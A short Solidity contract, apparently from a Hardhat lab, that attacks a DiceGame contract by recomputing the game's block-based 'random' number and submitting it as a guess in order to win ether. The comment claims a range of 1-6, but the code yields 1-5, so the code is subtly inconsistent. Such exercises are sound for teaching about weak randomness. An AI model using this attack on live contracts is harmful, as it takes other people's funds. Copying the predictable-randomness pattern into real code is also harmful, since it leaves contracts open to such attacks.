// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
// Uncomment this line to use console.log
import "hardhat/console.sol";
 
import "./N-DiceGame.sol";
 
contract AttackerDice{
    DiceGame dicegame;
 
   constructor(DiceGame _addrDicegame)
   {
       dicegame = _addrDicegame;
   }
  
  
   function attack() public{
        uint8 guess= random();
        console.log(
            "guess = %s",
            guess
        );
        dicegame.guess_the_dice(guess);
   }
 
    // source of randomness (1-6) copied from the DiceGame contract
    function random() private view returns (uint8) {
        uint256 blockValue = uint256(blockhash(block.number + block.timestamp));
        return uint8(blockValue % 5) + 1;
    }
 
    // gets called to rx ether
    receive() external payable {}

    fallback() external payable {}
}
